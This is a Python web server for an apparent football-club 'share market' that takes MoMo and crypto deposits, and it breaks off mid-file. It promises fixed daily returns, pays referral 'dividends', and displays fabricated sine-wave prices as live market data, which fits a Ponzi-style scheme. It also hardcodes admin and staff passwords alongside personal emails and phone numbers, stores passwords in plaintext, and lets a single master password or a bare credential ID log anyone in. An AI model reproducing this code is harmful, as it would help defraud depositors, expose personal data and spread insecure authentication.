#!/usr/bin/env python3
"""Own Club — Share Market. Stdlib only. Binds immediately for Railway."""
import json, os, hmac, hashlib, base64, time, uuid, re, threading
from datetime import datetime, timezone
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse, parse_qs

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "8080"))
SECRET = os.environ.get("IMATE1_SECRET", "ownclub-secret-2026").encode()
ADMIN_EMAIL = "k_hmed@yahoo.com"
ADMIN_PASS = os.environ.get("ADMIN_PASSWORD", "Madahketa@17")
ADMIN_PHONE = "+256780509960"
MOMO = os.environ.get("MOMO_NUMBER", "0779168109")
TRC20 = os.environ.get("TRC20_WALLET", "TX4so634h6M13YiCrE4cEncLQg4GgyXP7P")
# Alternate TRC20 used earlier in the project
TRC20_ALT = os.environ.get("TRC20_ALT", "TLvT3czNGgpPH3oXURZFtyd4XTQUL2NhGy")
ERC20 = os.environ.get("ERC20_WALLET", "0xe76D1AC2a2cF2A6248200a37b684AA6954e8B04A")
BEP20 = os.environ.get("BEP20_WALLET", "0xe76D1AC2a2cF2A6248200a37b684AA6954e8B04A")

def pay_methods():
    return {
        "momo": MOMO,
        "momo_ussd_mtn": f"*165*3*{MOMO}#",
        "momo_ussd_airtel": f"*185*9*{MOMO}#",
        "trc20": TRC20,
        "trc20_alt": TRC20_ALT,
        "erc20": ERC20,
        "bep20": BEP20,
        "min_deposit": 3000,
        "presets": [3000, 35000, 70000, 105000, 140000],
        "withdraw_fee_pct": 5,
    }

BASE = Path(__file__).resolve().parent
DATA = Path(os.environ.get("DATA_DIR", str(BASE / "data")))
DATA.mkdir(parents=True, exist_ok=True)
USERS_FILE = DATA / "users.json"
WD_FILE = DATA / "withdrawals.json"
POOL_FILE = DATA / "pool.json"
CREDITS_FILE = DATA / "credits.json"
DEFAULT_POOL_USD = float(os.environ.get("COMPANY_POOL_USD", "500000000"))
JOIN_BONUS_UGX = int(os.environ.get("JOIN_BONUS_UGX", "15000"))  # locked until first club share

def get_pool():
    data = load(POOL_FILE, None)
    if not data:
        data = {"usd": DEFAULT_POOL_USD, "movements": []}
        save(POOL_FILE, data)
    return data

def save_pool(data):
    save(POOL_FILE, data)

def pool_move(kind, amount_usd, note, meta=None):
    """kind: credit | debit. amount_usd positive number."""
    data = get_pool()
    amt = float(amount_usd)
    if kind == "debit":
        data["usd"] = round(float(data.get("usd") or 0) - amt, 4)
    else:
        data["usd"] = round(float(data.get("usd") or 0) + amt, 4)
    data.setdefault("movements", []).insert(0, {
        "at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "kind": kind,
        "amount_usd": amt,
        "balance_usd": data["usd"],
        "note": note,
        "meta": meta or {},
    })
    data["movements"] = data["movements"][:200]
    save_pool(data)
    return data

def ugx_to_usd(ugx):
    # approx rate for pool tracking (1 USD ≈ 3700 UGX)
    rate = float(os.environ.get("UGX_PER_USD", "3700"))
    return round(float(ugx) / rate, 4)


TIERS = [
    {"weeks": 1, "price": 35000, "label": "1 week", "daily": 5000},
    {"weeks": 2, "price": 70000, "label": "2 weeks", "daily": 7500},
    {"weeks": 3, "price": 105000, "label": "3 weeks", "daily": 10000},
    {"weeks": 4, "price": 140000, "label": "4 weeks", "daily": 12500},
]

def club(cid, name, league, crest, value):
    return {
        "id": cid, "name": name, "league": league, "photo": crest,
        "marketValue": value, "tiers": TIERS,
    }

CLUBS = [
    club(1, "Manchester City", "Premier League", "https://crests.football-data.org/65.png", "≈ $4.2B"),
    club(2, "Arsenal", "Premier League", "https://crests.football-data.org/57.png", "≈ $2.6B"),
    club(3, "Liverpool", "Premier League", "https://crests.football-data.org/64.png", "≈ $5.4B"),
    club(4, "Chelsea", "Premier League", "https://crests.football-data.org/61.png", "≈ $3.1B"),
    club(5, "Manchester United", "Premier League", "https://crests.football-data.org/66.png", "≈ $6.6B"),
    club(6, "Tottenham Hotspur", "Premier League", "https://crests.football-data.org/73.png", "≈ $2.8B"),
    club(7, "Real Madrid", "La Liga", "https://crests.football-data.org/86.png", "≈ $6.0B"),
    club(8, "FC Barcelona", "La Liga", "https://crests.football-data.org/81.png", "≈ $5.0B"),
    club(9, "Atletico Madrid", "La Liga", "https://crests.football-data.org/78.png", "≈ $1.5B"),
    club(10, "Sevilla", "La Liga", "https://crests.football-data.org/559.png", "≈ $0.40B"),
    club(11, "Villarreal", "La Liga", "https://crests.football-data.org/94.png", "≈ $0.45B"),
    club(12, "Real Sociedad", "La Liga", "https://crests.football-data.org/92.png", "≈ $0.70B"),
    club(13, "Inter Milan", "Serie A", "https://crests.football-data.org/108.png", "≈ $1.5B"),
    club(14, "AC Milan", "Serie A", "https://crests.football-data.org/98.png", "≈ $1.3B"),
    club(15, "Juventus", "Serie A", "https://crests.football-data.org/109.png", "≈ $2.0B"),
    club(16, "Napoli", "Serie A", "https://crests.football-data.org/113.png", "≈ $0.90B"),
    club(17, "Paris Saint-Germain", "Ligue 1", "https://crests.football-data.org/524.png", "≈ $4.2B"),
    club(18, "Olympique Marseille", "Ligue 1", "https://crests.football-data.org/516.png", "≈ $0.45B"),
    club(19, "Bayern Munich", "Bundesliga", "https://crests.football-data.org/5.png", "≈ $5.0B"),
    club(20, "Borussia Dortmund", "Bundesliga", "https://crests.football-data.org/4.png", "≈ $1.9B"),
    club(21, "Al Hilal", "Saudi Pro League", "https://crests.football-data.org/7467.png", "≈ $0.30B"),
    club(22, "Al Nassr", "Saudi Pro League", "https://crests.football-data.org/7468.png", "≈ $0.28B"),
    club(23, "Al Ittihad", "Saudi Pro League", "https://crests.football-data.org/7470.png", "≈ $0.22B"),
    club(24, "Al Ahli", "Saudi Pro League", "https://crests.football-data.org/7472.png", "≈ $0.20B"),
    club(25, "Inter Miami", "MLS", "https://crests.football-data.org/1031.png", "≈ $1.0B"),
    club(26, "LAFC", "MLS", "https://crests.football-data.org/2073.png", "≈ $1.2B"),
    club(27, "LA Galaxy", "MLS", "https://crests.football-data.org/2068.png", "≈ $0.90B"),
    club(28, "New York City FC", "MLS", "https://crests.football-data.org/2074.png", "≈ $0.70B"),
    club(29, "Leicester City", "Championship", "https://crests.football-data.org/338.png", "≈ $0.40B"),
    club(30, "Leeds United", "Championship", "https://crests.football-data.org/341.png", "≈ $0.40B"),
    club(31, "Southampton", "Championship", "https://crests.football-data.org/340.png", "≈ $0.38B"),
    club(32, "Ipswich Town", "Championship", "https://crests.football-data.org/349.png", "≈ $0.25B"),
]
LEAGUES = []
for c in CLUBS:
    if c["league"] not in LEAGUES:
        LEAGUES.append(c["league"])

LOCK = threading.Lock()

def load(path, default):
    try:
        if path.exists():
            return json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        print("[load]", path, e)
    return default

def save(path, data):
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(path)

def get_users():
    with LOCK:
        return load(USERS_FILE, [])

def save_users(users):
    with LOCK:
        save(USERS_FILE, users)

def find_user(**kw):
    users = get_users()
    if kw.get("uid"):
        return next((u for u in users if u.get("id") == kw["uid"]), None)
    if kw.get("email"):
        e = kw["email"].strip().lower()
        return next((u for u in users if (u.get("email") or "").lower() == e), None)
    if kw.get("phone"):
        d = re.sub(r"\D", "", kw["phone"])
        for u in users:
            up = re.sub(r"\D", "", str(u.get("phone") or ""))
            if d and up and (d == up or (len(d) >= 9 and len(up) >= 9 and d[-9:] == up[-9:])):
                return u
    return None

def update_user(user):
    users = get_users()
    for i, u in enumerate(users):
        if u.get("id") == user.get("id"):
            users[i] = user
            save_users(users)
            return
    users.append(user)
    save_users(users)

def hash_password(password):
    salt = os.urandom(16)
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 80_000)
    return base64.b64encode(salt + h).decode()

def verify_password(password, stored):
    try:
        raw = base64.b64decode(stored)
        salt, h = raw[:16], raw[16:]
        return hmac.compare_digest(h, hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 80_000))
    except Exception:
        return False

def make_token(uid, admin=False):
    payload = json.dumps({"uid": uid, "adm": bool(admin), "exp": int(time.time()) + 7 * 86400})
    sig = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(payload.encode()).decode() + "." + sig

def decode_token(token):
    try:
        body, sig = token.split(".", 1)
        payload = base64.urlsafe_b64decode(body.encode() + b"==").decode()
        expect = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expect, sig):
            return None
        data = json.loads(payload)
        if data.get("exp", 0) < time.time():
            return None
        return data
    except Exception:
        return None

def invite_code():
    return "IM" + uuid.uuid4().hex[:6].upper()

def public_user(u):
    return {
        "id": u.get("id"),
        "name": u.get("name"),
        "phone": u.get("phone"),
        "email": u.get("email"),
        "invite_code": u.get("invite_code"),
        "used_invite": u.get("used_invite"),
        "referred_by": u.get("referred_by"),
        "balance": u.get("balance", 0),
        "locked": u.get("locked", 0),
        "shares": u.get("shares", []),
        "deposits": u.get("deposits", [])[-30:],
        "transactions": u.get("transactions", [])[:40],
        "is_admin": bool(u.get("is_admin")),
        "is_support": bool(u.get("is_support")),
        "title": u.get("title") or "",
        "referral_earnings": u.get("referral_earnings", 0),
        "pending_withdraw": u.get("pending_withdraw", 0),
        "join_bonus": u.get("join_bonus", 0),
        "join_bonus_locked": u.get("join_bonus_locked", 0),
        "bonus_unlocked": bool(u.get("shares")),
        "dividends": u.get("dividends", 0),
        "dividend_available": u.get("dividend_available", 0),
        "raffle_tickets": int(u.get("raffle_tickets") or 0),
        "avatar": u.get("avatar") or "default",
        "payout_method": u.get("payout_method") or "",
        "payout_account": u.get("payout_account") or "",
        "wd_pin_set": bool(u.get("wd_pin_hash")),
        "biometric_on": bool(u.get("biometric_on") or u.get("webauthn_ids")),
        "title": u.get("title") or "",
        "withdrawable": (
            max(0.0, float(u.get("balance") or 0) - float(u.get("join_bonus_locked") or 0))
            if (u.get("shares") and len(u.get("shares") or []) > 0)
            else float(u.get("dividend_available") or 0)
        ),
    }

def seed():
    users = get_users()
    staff = [
        ("admin", "Admin (Owner)", ADMIN_PHONE, ADMIN_EMAIL, ADMIN_PASS, True, False, "IMXT2Y0M8D", "Owner"),
        ("staff_kato", "James Kato", "", "katojamex@gmail.com", "Trade001", False, True, "STAFF0KATO", "Support"),
        ("staff_mugaga", "Mugaga Muto", "+96550051932", "mugagamuto04@gmail.com", "Muto@2026", False, True, "STAFFMUTO", "Co-Manager"),
    ]
    changed = False
    emails = {(u.get("email") or "").lower() for u in users}
    for sid, name, phone, email, pw, adm, sup, code, title in staff:
        if email.lower() in emails:
            continue
        users.append({
            "id": sid, "name": name, "phone": phone, "email": email,
            "password_hash": hash_password(pw), "password": pw,
            "invite_code": code, "balance": 0, "locked": 0,
            "shares": [], "deposits": [], "transactions": [],
            "is_admin": adm, "is_support": sup, "title": title,
            "referral_earnings": 0, "referred_by": None,
        })
        emails.add(email.lower())
        changed = True
        print("[seed]", email)
    if changed:
        save_users(users)


# --- WebSocket (stdlib) ---
WS_CLIENTS = set()
WS_LOCK = threading.Lock()

def _ws_accept_key(key: str) -> str:
    guid = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    digest = hashlib.sha1((key + guid).encode()).digest()
    return base64.b64encode(digest).decode()

def _ws_send_frame(sock, data: bytes, opcode=0x1):
    # text frame, unmasked (server → client)
    ln = len(data)
    if ln < 126:
        hdr = bytes([0x80 | opcode, ln])
    elif ln < 65536:
        hdr = bytes([0x80 | opcode, 126]) + ln.to_bytes(2, "big")
    else:
        hdr = bytes([0x80 | opcode, 127]) + ln.to_bytes(8, "big")
    sock.sendall(hdr + data)

def _ws_read_frame(sock):
    hdr = sock.recv(2)
    if not hdr or len(hdr) < 2:
        return None, None
    opcode = hdr[0] & 0x0F
    masked = (hdr[1] & 0x80) != 0
    ln = hdr[1] & 0x7F
    if ln == 126:
        ext = sock.recv(2)
        ln = int.from_bytes(ext, "big")
    elif ln == 127:
        ext = sock.recv(8)
        ln = int.from_bytes(ext, "big")
    mask = sock.recv(4) if masked else b""
    data = b""
    while len(data) < ln:
        chunk = sock.recv(ln - len(data))
        if not chunk:
            break
        data += chunk
    if masked and mask:
        data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    return opcode, data

def ws_broadcast(event, data=None, user_id=None, admin_only=False):
    payload = json.dumps({"event": event, "data": data or {}}, ensure_ascii=False).encode()
    dead = []
    with WS_LOCK:
        clients = list(WS_CLIENTS)
    for c in clients:
        try:
            if user_id and c.get("user_id") and c["user_id"] != user_id and not c.get("is_admin"):
                continue
            if admin_only and not c.get("is_admin"):
                continue
            _ws_send_frame(c["sock"], payload)
        except Exception:
            dead.append(c)
    if dead:
        with WS_LOCK:
            for c in dead:
                WS_CLIENTS.discard(c)
                try:
                    c["sock"].close()
                except Exception:
                    pass

def market_snapshot():
    import math
    now = time.time()
    items = []
    for c in CLUBS:
        m = re.search(r"([\d.]+)", str(c.get("marketValue") or ""))
        bn = float(m.group(1)) if m else 1.0 + c["id"] * 0.15
        base = int(35000 * (0.85 + bn * 0.08))
        wave = math.sin(now / 17.0 + c["id"] * 1.7) * 0.012
        wave2 = math.sin(now / 9.0 + c["id"]) * 0.006
        price = max(1000, int(base * (1 + wave + wave2)))
        open_p = base
        chg = ((price - open_p) / open_p) * 100
        hist = [max(1000, int(base * (1 + math.sin(now / 15.0 + c["id"] + i * 0.4) * 0.015))) for i in range(12)]
        items.append({
            "id": c["id"], "name": c["name"], "league": c["league"],
            "photo": c["photo"], "marketValue": c["marketValue"],
            "price": price, "open": open_p, "change_pct": round(chg, 2), "hist": hist,
        })
    return {"updated": int(now), "clubs": items}

def market_broadcast_loop():
    while True:
        try:
            ws_broadcast("market", market_snapshot())
        except Exception as e:
            print("[ws] market", e)
        time.sleep(2)



def count_direct_refs(uid):
    return sum(1 for u in get_users() if u.get("referred_by") == uid)

def apply_weekly_dividends(user):
    """Junior Shareholder: 2+ directs → every 7 days, 20% of each L1 joining deposit."""
    directs = [u for u in get_users() if u.get("referred_by") == user.get("id")]
    if len(directs) < 2:
        return user, 0.0
    if user.get("title") not in ("Junior Shareholder", "Owner") and not user.get("is_admin"):
        user["title"] = "Junior Shareholder"
    last = user.get("last_div_at") or 0
    now = time.time()
    if last and now - float(last) < 7 * 86400:
        return user, 0.0
    total = 0.0
    for d in directs:
        base = float(d.get("joining_deposit") or d.get("join_bonus") or JOIN_BONUS_UGX)
        pay = round(base * 0.20, 2)
        if pay <= 0:
            continue
        total += pay
        user.setdefault("transactions", []).insert(0, {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": f"Weekly dividend 20% · {d.get('name')}",
            "amount": pay,
            "status": "dividend",
        })
    if total > 0:
        user["balance"] = round(float(user.get("balance") or 0) + total, 2)
        user["dividends"] = round(float(user.get("dividends") or 0) + total, 2)
        user["dividend_available"] = round(float(user.get("dividend_available") or 0) + total, 2)
        user["last_div_at"] = now
        try:
            pool_move("debit", ugx_to_usd(total), "Weekly junior shareholder dividend", {"user_id": user.get("id"), "ugx": total})
        except Exception:
            pass
    return user, total

def pay_join_dividend(parent, child, amount, note):
    if not parent or amount <= 0:
        return
    parent["balance"] = round(float(parent.get("balance") or 0) + amount, 2)
    parent["dividends"] = round(float(parent.get("dividends") or 0) + amount, 2)
    parent["dividend_available"] = round(float(parent.get("dividend_available") or 0) + amount, 2)
    parent["referral_earnings"] = round(float(parent.get("referral_earnings") or 0) + amount, 2)
    parent.setdefault("transactions", []).insert(0, {
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "type": note,
        "amount": amount,
        "status": "dividend",
    })
    if count_direct_refs(parent.get("id")) >= 2 and not parent.get("is_admin"):
        parent["title"] = parent.get("title") or "Junior Shareholder"
        if parent.get("title") in ("", None):
            parent["title"] = "Junior Shareholder"
        if parent.get("title") not in ("Owner", "Co-Manager", "Support"):
            parent["title"] = "Junior Shareholder"
    update_user(parent)
    try:
        pool_move("debit", ugx_to_usd(amount), note, {"user_id": parent.get("id"), "ugx": amount})
        ws_broadcast("balance_update", {"user": public_user(parent)}, user_id=parent.get("id"))
    except Exception:
        pass


def admin_stats_payload():
    users = get_users()
    wds = load(WD_FILE, [])
    deps = []
    for u in users:
        for d in u.get("deposits") or []:
            x = dict(d)
            x["user_id"] = u.get("id")
            x["user_name"] = u.get("name")
            deps.append(x)
    pool = get_pool()
    return {
        "users": len(users),
        "pool_usd": pool.get("usd"),
        "pending_deposits": sum(1 for d in deps if d.get("status") in ("pending","under_review")),
        "pending_wd": sum(1 for w in wds if w.get("status") in ("under_review","pending")),
        "ts": int(time.time()),
    }

def stats_broadcast_loop():
    while True:
        try:
            ws_broadcast("stats", admin_stats_payload(), admin_only=True)
        except Exception as e:
            print("[ws] stats", e)
        time.sleep(4)

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0] if args else fmt}", flush=True)

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def _json(self, code, data):
        body = json.dumps(data, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _file(self, name, ctype):
        path = BASE / name
        if not path.exists():
            return self._json(404, {"error": "missing " + name})
        data = path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0:
            return {}
        return json.loads(self.rfile.read(n).decode() or "{}")

    def _auth(self):
        h = self.headers.get("Authorization") or ""
        if h.startswith("Bearer "):
            return decode_token(h[7:].strip())
        return None

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()


    def _ws_handshake(self):
        key = self.headers.get("Sec-WebSocket-Key")
        if not key:
            return self._json(400, {"error": "Missing Sec-WebSocket-Key", "ws": True})
        accept = _ws_accept_key(key)
        self.send_response(101, "Switching Protocols")
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept)
        self.end_headers()
        sock = self.connection
        client = {"sock": sock, "user_id": None, "is_admin": False, "alive": True}
        qs = parse_qs(urlparse(self.path).query)
        tok = (qs.get("token") or [""])[0]
        if tok:
            payload = decode_token(tok)
            if payload:
                client["user_id"] = payload.get("uid")
                client["is_admin"] = bool(payload.get("adm"))
                u = find_user(uid=client["user_id"])
                if u and (u.get("is_admin") or u.get("is_support")):
                    client["is_admin"] = True
        with WS_LOCK:
            WS_CLIENTS.add(client)
        try:
            _ws_send_frame(sock, json.dumps({"event": "connected", "data": {"ok": True, "clients": len(WS_CLIENTS)}}).encode())
            _ws_send_frame(sock, json.dumps({"event": "market", "data": market_snapshot()}).encode())
        except Exception:
            pass
        try:
            while client["alive"]:
                opcode, data = _ws_read_frame(sock)
                if opcode is None:
                    break
                if opcode == 0x8:
                    break
                if opcode == 0x9:
                    try:
                        _ws_send_frame(sock, data or b"", opcode=0xA)
                    except Exception:
                        break
                if opcode == 0x1 and data:
                    try:
                        msg = json.loads(data.decode("utf-8"))
                        if msg.get("type") == "auth" and msg.get("token"):
                            payload = decode_token(msg["token"])
                            if payload:
                                client["user_id"] = payload.get("uid")
                                client["is_admin"] = bool(payload.get("adm"))
                                u = find_user(uid=client["user_id"])
                                if u and (u.get("is_admin") or u.get("is_support")):
                                    client["is_admin"] = True
                                _ws_send_frame(sock, json.dumps({"event": "authed", "data": {"user_id": client["user_id"]}}).encode())
                        elif msg.get("type") == "ping":
                            _ws_send_frame(sock, json.dumps({"event": "pong", "data": {}}).encode())
                        elif msg.get("type") == "subscribe_market":
                            _ws_send_frame(sock, json.dumps({"event": "market", "data": market_snapshot()}).encode())
                    except Exception:
                        pass
        finally:
            with WS_LOCK:
                WS_CLIENTS.discard(client)
            try:
                sock.close()
            except Exception:
                pass

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ("/ws", "/api/ws", "/realtime") or path.startswith("/ws"):
            upgrade = (self.headers.get("Upgrade") or "").lower()
            key = self.headers.get("Sec-WebSocket-Key")
            if "websocket" in upgrade and key:
                return self._ws_handshake()
            return self._json(200, {"ok": True, "ws": True, "hint": "Connect with WebSocket Upgrade"})
        if path in ("/api/health", "/health", "/healthz", "/ping"):
            return self._json(200, {"ok": True, "service": "ownclubshares", "port": PORT})
        if path in ("/", "/index.html", "/app"):
            return self._file("index.html", "text/html; charset=utf-8")
        if path in ("/admin", "/admin.html"):
            return self._file("admin.html", "text/html; charset=utf-8")
        if path == "/frontend.html":
            return self._file("index.html", "text/html; charset=utf-8")
        if path == "/manifest.json":
            return self._file("manifest.json", "application/manifest+json")
        if path == "/sw.js":
            return self._file("sw.js", "application/javascript")
        if path.startswith("/static/"):
            name = path[1:]  # static/...
            ctype = "application/octet-stream"
            if name.endswith(".png"): ctype = "image/png"
            elif name.endswith(".jpg") or name.endswith(".jpeg"): ctype = "image/jpeg"
            elif name.endswith(".svg"): ctype = "image/svg+xml"
            elif name.endswith(".css"): ctype = "text/css"
            elif name.endswith(".js"): ctype = "application/javascript"
            return self._file(name, ctype)
        if path == "/api/clubs":
            return self._json(200, {"leagues": LEAGUES, "clubs": CLUBS})
        if path == "/api/market":
            import math
            now = time.time()
            items = []
            for c in CLUBS:
                m = re.search(r"([\d.]+)", str(c.get("marketValue") or ""))
                bn = float(m.group(1)) if m else 1.0 + c["id"] * 0.15
                base = int(35000 * (0.85 + bn * 0.08))
                wave = math.sin(now / 17.0 + c["id"] * 1.7) * 0.012
                wave2 = math.sin(now / 9.0 + c["id"]) * 0.006
                price = max(1000, int(base * (1 + wave + wave2)))
                open_p = base
                chg = ((price - open_p) / open_p) * 100
                hist = [max(1000, int(base * (1 + math.sin(now / 15.0 + c["id"] + i * 0.4) * 0.015))) for i in range(12)]
                items.append({
                    "id": c["id"], "name": c["name"], "league": c["league"],
                    "photo": c["photo"], "marketValue": c["marketValue"],
                    "price": price, "open": open_p, "change_pct": round(chg, 2), "hist": hist,
                    "tiers": c.get("tiers"),
                })
            return self._json(200, {"updated": int(now), "clubs": items, "leagues": LEAGUES})
        tok = self._auth()
        if path == "/api/me":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u:
                return self._json(401, {"error": "Account not found"})
            u, extra = apply_weekly_dividends(u)
            if extra:
                update_user(u)
            return self._json(200, {"user": public_user(u), "pay": pay_methods()})
        if path == "/api/admin/users":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            return self._json(200, {"users": [public_user(x) for x in get_users()]})
        if path == "/api/admin/deposits":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            items = []
            for x in get_users():
                for d in x.get("deposits") or []:
                    items.append({**d, "user_id": x.get("id"), "user_name": x.get("name"), "user_phone": x.get("phone")})
            items.sort(key=lambda z: z.get("created_at") or "", reverse=True)
            return self._json(200, {"deposits": items})
        if path == "/api/admin/credits":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            return self._json(200, {"credits": load(CREDITS_FILE, []), "pool": get_pool()})
        if path == "/api/admin/withdrawals":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            return self._json(200, {"withdrawals": load(WD_FILE, [])})
        if path == "/api/admin/stats":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            users = get_users()
            deps = []
            for x in users:
                for d in x.get("deposits") or []:
                    deps.append(d)
            wds = load(WD_FILE, [])
            confirmed = [d for d in deps if d.get("status") == "confirmed"]
            pending_d = [d for d in deps if d.get("status") == "pending"]
            total_dep = sum(float(d.get("amount") or 0) for d in confirmed)
            total_bal = sum(float(x.get("balance") or 0) for x in users)
            total_shares = sum(len(x.get("shares") or []) for x in users)
            ref_pay = sum(float(x.get("referral_earnings") or 0) for x in users)
            # simple hourly sparkline placeholders from deposit times
            spark = [0] * 12
            for d in confirmed[-30:]:
                try:
                    h = int((d.get("created_at") or "12:00").split()[-1].split(":")[0]) % 12
                    spark[h] += 1
                except Exception:
                    spark[6] += 1
            pool = get_pool()
            credits = load(CREDITS_FILE, [])
            return self._json(200, {
                "users": len(users),
                "deposits_count": len(confirmed),
                "pending_deposits": len(pending_d),
                "total_deposited": total_dep,
                "total_balances": total_bal,
                "total_shares": total_shares,
                "referral_payouts": ref_pay,
                "pending_withdrawals": len([w for w in wds if w.get("status") in ("under_review", "pending")]),
                "pending_wd_amount": sum(float(w.get("amount") or 0) for w in wds if w.get("status") in ("under_review", "pending")),
                "pool_usd": pool.get("usd"),
                "pool_movements": (pool.get("movements") or [])[:30],
                "credits": credits[:50],
                "spark": spark,
            })
        return self._json(404, {"error": "Not found"})

    def do_POST(self):
        path = urlparse(self.path).path
        try:
            body = self._read()
        except Exception:
            return self._json(400, {"error": "Bad JSON"})

        if path == "/api/register":
            name = (body.get("name") or "").strip()
            email = (body.get("email") or "").strip().lower()
            phone = (body.get("phone") or "").strip()
            password = body.get("password") or ""
            if not name or not email or not phone or len(password) < 4:
                return self._json(400, {"error": "Name, phone, email and password required"})
            if "@" not in email:
                return self._json(400, {"error": "Valid email required"})
            if find_user(email=email):
                return self._json(400, {"error": "Email already registered"})
            if find_user(phone=phone):
                return self._json(400, {"error": "Phone already registered"})
            invite = (body.get("ref") or body.get("invite") or "IMXT2Y0M8D").strip().upper()
            ref = next((x for x in get_users() if (x.get("invite_code") or "").upper() == invite), None)
            bonus = JOIN_BONUS_UGX
            user = {
                "id": "u_" + uuid.uuid4().hex[:10],
                "name": name, "email": email, "phone": phone,
                "password_hash": hash_password(password), "password": password,
                "invite_code": invite_code(), "used_invite": invite,
                "country": (body.get("country") or "").strip()[:60],
                "referred_by": ref["id"] if ref else None,
                "balance": bonus, "locked": 0, "shares": [], "deposits": [],
                "transactions": [{
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": "Joining bonus (locked until first club share)",
                    "amount": bonus,
                    "status": "locked",
                }],
                "is_admin": False, "is_support": False,
                "referral_earnings": 0,
                "join_bonus": bonus,
                "join_bonus_locked": bonus,
                "created": datetime.now(timezone.utc).isoformat(),
            }
            update_user(user)
            user["joining_deposit"] = 0
            try:
                pool_move("debit", ugx_to_usd(bonus), "Joining bonus to new member", {"user_id": user["id"], "ugx": bonus})
            except Exception as e:
                print("[pool] join bonus", e)
            if ref:
                half = round(bonus * 0.5, 2)
                pay_join_dividend(ref, user, half, f"Join dividend 50% · {name}")
            token = make_token(user["id"], False)
            return self._json(201, {
                "token": token,
                "user": public_user(user),
                "message": f"Account created. Joining bonus UGX {bonus:,} is locked until you buy club shares.",
            })

        if path == "/api/login":
            ident = (body.get("identifier") or body.get("email") or body.get("phone") or "").strip()
            password = body.get("password") or ""
            u = find_user(email=ident) or find_user(phone=ident)
            if not u:
                return self._json(401, {"error": "Invalid login"})
            ok = verify_password(password, u.get("password_hash") or "") or (u.get("password") == password)
            if u.get("is_admin") and password == ADMIN_PASS:
                ok = True
            if not ok:
                return self._json(401, {"error": "Invalid login"})
            return self._json(200, {"token": make_token(u["id"], bool(u.get("is_admin"))), "user": public_user(u)})

        if path == "/api/login/biometric":
            cred = (body.get("credential_id") or "").strip()
            if not cred:
                return self._json(400, {"error": "Missing biometric credential"})
            u = None
            for x in get_users():
                ids = x.get("webauthn_ids") or []
                if cred in ids:
                    u = x
                    break
            if not u:
                return self._json(401, {"error": "No Face ID / fingerprint registered on this account"})
            return self._json(200, {"token": make_token(u["id"], bool(u.get("is_admin"))), "user": public_user(u)})

        tok = self._auth()
        if not tok:
            return self._json(401, {"error": "Please log in"})
        user = find_user(uid=tok["uid"])
        if not user:
            return self._json(401, {"error": "Account not found"})

        if path == "/api/biometric/register":
            cred = (body.get("credential_id") or "").strip()
            if not cred:
                return self._json(400, {"error": "Missing credential"})
            ids = list(user.get("webauthn_ids") or [])
            if cred not in ids:
                ids.append(cred)
            user["webauthn_ids"] = ids[-8:]
            user["biometric_on"] = True
            update_user(user)
            return self._json(200, {"ok": True, "message": "Face ID / fingerprint saved for this device", "user": public_user(user)})

        if path == "/api/deposit":
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            txid = (body.get("txid") or body.get("txId") or "").strip()
            method = (body.get("method") or "momo").strip().lower()
            allowed = {"momo", "mtn", "airtel", "usdt", "trc20", "erc20", "bep20"}
            if method not in allowed:
                return self._json(400, {"error": "Choose MoMo, MTN, Airtel, USDT TRC20, ERC20 or BEP20"})
            if amount < 3000:
                return self._json(400, {"error": "Minimum deposit is UGX 3,000"})
            if not txid:
                return self._json(400, {"error": "Transaction ID required after you pay"})
            dep = {
                "id": "d_" + uuid.uuid4().hex[:10],
                "amount": amount, "txid": txid, "method": method,
